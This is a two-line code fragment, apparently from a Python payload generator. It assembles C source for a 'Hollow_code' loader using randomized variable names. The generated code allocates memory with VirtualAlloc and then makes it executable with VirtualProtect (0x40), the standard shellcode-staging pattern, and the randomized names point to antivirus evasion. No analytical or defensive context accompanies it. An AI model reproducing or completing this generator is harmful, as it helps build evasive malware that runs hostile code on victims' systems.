...
Hollow_code += Randbuff + " = VirtualAlloc(0, " + Randvarsize + " + 5,MEM_COMMIT,PAGE_READWRITE);\n"
...
Hollow_code += "BOOL " + Randbool + " = VirtualProtect(" + Randbuff + "," + Randvarsize + " + 5,0x40,&" + Oldprot + ");\n"
